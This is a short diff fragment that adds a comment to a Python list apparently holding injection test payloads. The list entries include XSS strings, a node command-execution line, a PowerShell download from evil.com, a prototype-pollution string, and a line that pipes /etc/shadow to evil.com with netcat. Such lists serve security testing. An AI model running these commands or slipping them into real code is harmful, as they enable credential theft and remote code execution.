@@ -374,6 +374,7 @@ _INJECTION = [
     "<svg onload=alert(document.domain)>",
     "node -e \"require('child_process').exec('id')\"",
     "powershell -c Invoke-WebRequest http://evil.com/exe",
+    # i18n: functional (prototype-pollution payload using the Chinese "constructor" name)
     "构造函数.prototype.polluted=true",
     "<iframe src=javascript:alert(1)>",
     "cat /etc/shadow | nc evil.com 4444",
